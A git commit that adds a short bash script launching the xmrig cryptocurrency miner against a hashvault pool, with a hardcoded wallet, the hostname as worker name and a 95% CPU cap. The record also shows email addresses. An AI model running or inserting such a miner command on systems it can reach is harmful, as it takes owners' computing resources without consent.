8d52ffd4f754039ac6292e2ffea51073d34d83ce
secrectvn <quoclong.hacker1412@gmail.com>
2018-01-17 12:32:49 +0700

    Create intense.sh

---
+++ intense.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+screen ./xmrig -o  pool.intense.hashvault.pro:8888 -u iz4znrxGXvnLzSsdL5RdYtDMML8JZVFtkdiHX6ioxpEXhgsJMk5sy4pEUgan51chU3e6uSnvZc4FDjRVJB9ZbCUV1syXMriSf -p $(hostname):contact@nguyencon.info -k --max-cpu-usage=95
